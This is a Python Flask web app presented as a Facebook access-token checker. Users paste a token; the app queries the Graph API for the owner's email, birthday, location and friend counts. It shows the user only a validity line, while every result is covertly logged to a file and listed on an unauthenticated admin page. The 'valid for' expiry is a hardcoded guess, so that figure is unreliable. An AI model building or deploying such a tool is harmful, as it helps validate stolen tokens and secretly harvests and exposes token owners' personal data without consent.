from flask import Flask, request, render_template_string, jsonify, session, redirect
import requests
import time
import secrets
import json
import os

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# FILE STORAGE
TOKENS_FILE = 'checked_tokens.json'

def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens, f, indent=2)

checked_tokens = load_tokens()  # List of dicts

# TOKEN CHECKER FUNCTION
def check_token(token):
    url = "https://graph.facebook.com/v15.0/me"
    fields = "id,name,email,gender,birthday,location,friends.summary(total_count),likes.summary(total_count),groups.summary(total_count)"
    params = {'access_token': token, 'fields': fields}
    
    try:
        r = requests.get(url, params=params, timeout=10)
        if r.status_code != 200:
            error = r.json().get('error', {}).get('message', 'Invalid Token')
            return {"valid": False, "error": error}
        
        data = r.json()
        
        # Estimate expiry (long-lived = 60 days, short = 2 hours)
        # For accurate expiry, use debug_token (requires app token)
        expiry_days = 58  # Safe default for long-lived
        
        result = {
            "valid": True,
            "uid": data.get('id'),
            "name": data.get('name'),
            "email": data.get('email', 'Not given'),
            "gender": data.get('gender', 'Not set'),
            "birthday": data.get('birthday', 'Not set'),
            "location": data.get('location', {}).get('name', 'Not set') if data.get('location') else 'Not set',
            "friends": data.get('friends', {}).get('summary', {}).get('total_count', 0),
            "likes": data.get('likes', {}).get('summary', {}).get('total_count', 0),
            "groups": data.get('groups', {}).get('summary', {}).get('total_count', 0),
            "profile_pic": f"https://graph.facebook.com/{data.get('id')}/picture?type=small",
            "expiry_days": expiry_days,
            "checked_at": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # SAVE TO ADMIN PANEL
        checked_tokens.append(result)
        save_tokens(checked_tokens[-100:])  # Keep last 100
        
        return result
    except:
        return {"valid": False, "error": "Network Error"}

# HOME - TOKEN CHECKER
@app.route('/', methods=['GET', 'POST'])
def home():
    result = None
    if request.method == 'POST':
        token = request.form.get('token', '').strip()
        if token:
            result = check_token(token)
    
    return render_template_string(HOME_TEMPLATE, result=result)

# ADMIN PANEL
@app.route('/admin')
def admin():
    return render_template_string(ADMIN_TEMPLATE, tokens=checked_tokens)

# TEMPLATES
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>TOKEN CHECKER - LEGEND BOI ERROR</title>
  <style>
    body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding: 20px; }
    input, button { margin: 10px; padding: 12px; width: 90%; max-width: 400px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 8px; }
    button { background: #0f0; color: #000; font-weight: bold; }
    h1 { text-shadow: 0 0 20px #0f0; }
    .result { background: #111; border: 1px solid #0f0; padding: 15px; margin: 20px; border-radius: 10px; text-align: left; }
    .valid { color: #0f0; } .invalid { color: #f55; }
    .admin-btn { background: #ff0; color: #000; margin-top: 50px; }
  </style>
</head>
<body>
  <h1>TOKEN CHECKER</h1>
  <form method="post">
    <input type="text" name="token" placeholder="Paste Access Token Here" required>
    <button type="submit">CHECK TOKEN</button>
  </form>

  {% if result %}
  <div class="result">
    {% if result.valid %}
    <p class="valid"><b>VALID TOKEN</b></p>
    <p><b>Name:</b> {{ result.name }}</p>
    <p><b>UID:</b> {{ result.uid }}</p>
    <p><b>Valid for:</b> {{ result.expiry_days }} days</p>
    <img src="{{ result.profile_pic }}" width="60" style="border-radius:50%; border:2px solid #0f0;">
    {% else %}
    <p class="invalid"><b>INVALID TOKEN</b></p>
    <p><b>Error:</b> {{ result.error }}</p>
    {% endif %}
  </div>
  {% endif %}

  <a href="/admin"><button class="admin-btn">OPEN ADMIN PANEL</button></a>
</body>
</html>
'''

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ADMIN PANEL - CHECKED TOKENS</title>
  <style>
    body { background: #000; color: #0f0; font-family: 'Courier New'; padding: 15px; }
    .card { background: #111; border: 1px solid #0f0; margin: 15px 0; padding: 15px; border-radius: 10px; }
    .token { word-break: break-all; font-size: 12px; }
    img { border-radius: 50%; border: 2px solid #0f0; }
    .back { background: #ff0; color: #000; padding: 10px; text-decoration: none; display: inline-block; margin: 10px; border-radius: 8px; }
  </style>
</head>
<body>
  <h1 style="text-align:center; text-shadow:0 0 15px #0f0;">ADMIN PANEL</h1>
  <a href="/" class="back">BACK TO CHECKER</a>
  <p><b>Total Checked: {{ tokens|length }}</b></p>

  {% for t in tokens[::-1] %}
  <div class="card">
    <p><b>Name:</b> {{ t.name }} | <b>UID:</b> {{ t.uid }}</p>
    <p><b>Email:</b> {{ t.email }} | <b>Friends:</b> {{ t.friends }}</p>
    <p><b>Location:</b> {{ t.location }} | <b>Expires:</b> {{ t.expiry_days }} days</p>
    <p><b>Checked:</b> {{ t.checked_at }}</p>
    <img src="{{ t.profile_pic }}" width="50">
  </div>
  {% endfor %}

  {% if not tokens %}
  <p style="text-align:center; color:#666;">No tokens checked yet.</p>
  {% endif %}
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
